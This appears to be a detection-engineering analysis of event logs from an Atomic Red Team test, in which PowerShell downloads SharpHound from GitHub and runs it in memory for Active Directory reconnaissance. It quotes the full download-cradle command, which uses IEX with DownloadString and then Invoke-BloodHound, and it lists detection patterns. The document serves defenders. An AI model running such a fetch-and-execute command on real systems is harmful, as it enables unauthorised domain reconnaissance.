# T1059.001-3: PowerShell — Run BloodHound from Memory Using Download Cradle

## Technique Context

T1059.001 (PowerShell) is the execution method. This test combines a download cradle with in-memory execution of BloodHound's SharpHound ingestor — a fileless variant of the technique captured in test 2 (which loaded SharpHound from a pre-staged file on disk). The command uses `IEX (New-Object Net.Webclient).DownloadString(...)` to fetch `SharpHound.ps1` directly from GitHub into memory and immediately execute it with `Invoke-BloodHound`, without writing the script to disk first.

This approach is a core fileless execution pattern: the malicious script exists only in PowerShell's memory during execution, leaving no file-system artifact from the script itself. Detection must therefore rely on network telemetry (the download), script block logging (EID 4104, which captures content regardless of whether it was written to disk), or behavioral indicators of the BloodHound collection phase.

The specific URL used is: `https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1` — a pinned commit from the BloodHound repository. The `-ForegroundColor Cyan` write-host that precedes the download is a human-oriented status message baked into the ART test definition, visible in the EID 4688 command line.

In defended environments, Defender terminates the process with `STATUS_ACCESS_DENIED` (0xC0000022) before the download executes. This dataset captures the undefended execution, where the script downloads and runs.

## What This Dataset Contains

Security EID 4688 provides the complete command line for the malicious PowerShell child (parent 0x193c):

```
"powershell.exe" & {write-host "Remote download of SharpHound.ps1 into memory, followed by
execution of the script" -ForegroundColor Cyan
IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
Invoke-BloodHound -OutputDirectory $env:Temp
Start-Sleep 5}
```

A cleanup step is also captured: `"powershell.exe" & {Remove-Item $env:Temp\*BloodHound.zip -Force}` — identical to the cleanup in test 2, confirming that `Invoke-BloodHound` writes a zip archive to `%TEMP%` during collection.

Two `whoami.exe` processes are visible in EID 4688, consistent with the pre- and post-execution context checks in the ART test framework.

The PowerShell channel has 96 events (93 EID 4104, 2 EID 4100, 1 EID 4103). The 93 script blocks include the SharpHound module content that was downloaded and executed in memory — the complete PowerShell script from GitHub. This is the primary forensic value of EID 4104 in fileless execution scenarios: the script is captured in the log even though it was never written to disk.

Sysmon contributes 18 events across EIDs 7, 10, 1, 17, and 8. EID 1 captures two `whoami.exe` instances and the cleanup PowerShell process (`Remove-Item $env:Temp\*BloodHound.zip -Force`). EID 8 shows PowerShell creating a remote thread in an unknown process — the same ART test framework artifact seen across this test series. EID 10 shows full-access handle opens (0x1FFFFF) from PowerShell to `whoami.exe` and to child processes. EID 17 shows two PSHost named pipes, reflecting the two PowerShell instances in the test framework.

Compared to the defended version (18 sysmon, 4 security, 96 powershell events — nearly identical counts), the key difference is execution outcome: the defended version exits with 0xC0000022 and the 4104 content is only test framework boilerplate. This undefended version completes the download and runs SharpHound, so the 93 EID 4104 blocks contain the actual SharpHound source code and its execution.

## What This Dataset Does Not Contain

No Sysmon EID 3 network connection events are present, so the HTTP request to `raw.githubusercontent.com` is not directly recorded. There are no DNS query events (EID 22). Unlike test 19 (PowerUp download-cradle), the TLS certificate cache writes from `iexplore.exe` that appeared there do not appear here — the network client used (`Net.Webclient`) may not trigger the same certificate-cache behavior, or the timing was different.

No Sysmon EID 11 file-creation events appear for the BloodHound output zip — only the cleanup command line in EID 4688 confirms a zip was created and then deleted. The LDAP/ADWS connections SharpHound makes to the domain controller are not recorded.

## Assessment

This dataset is the fileless-execution counterpart to test 2. The most important difference from the detection perspective is that EID 4104 captures the downloaded SharpHound script in memory — the full module source code appears across the 93 script blocks — even though no `.ps1` file was written to disk. This is the canonical argument for deploying PowerShell script block logging: it closes the visibility gap that fileless techniques create for file-based detectors.

The EID 4688 cleanup step `Remove-Item $env:Temp\*BloodHound.zip -Force` is a useful artifact: it confirms collection succeeded (a zip was created) and that the attacker or tool attempted post-collection cleanup, which is common operational security practice.

## Detection Opportunities Present in This Data

1. EID 4688 `CommandLine` containing `IEX (New-Object Net.Webclient).DownloadString(` — the classic download cradle pattern with direct invocation via IEX.
2. EID 4688 URL string `raw.githubusercontent.com/BloodHoundAD/BloodHound/` — a known-bad domain and path pattern for BloodHound tools.
3. EID 4688 containing `Invoke-BloodHound -OutputDirectory $env:Temp` — the specific BloodHound collection function with output staged in the user's temp directory.
4. EID 4688 cleanup command `Remove-Item $env:Temp\*BloodHound.zip -Force` — wildcard deletion of files matching the BloodHound output naming pattern; post-collection cleanup as an indicator.
5. EID 4104 (93 blocks) containing SharpHound module source code — fileless execution captured by script block logging despite no file being written to disk.
6. Sysmon EID 8 from `powershell.exe` to `<unknown process>` — CreateRemoteThread with unresolved target from a PowerShell session involved in network-based execution.
7. Two sequential `whoami.exe` executions (EID 4688 / Sysmon EID 1) parented by PowerShell — identity verification before and after a significant operation is a common attacker pattern.
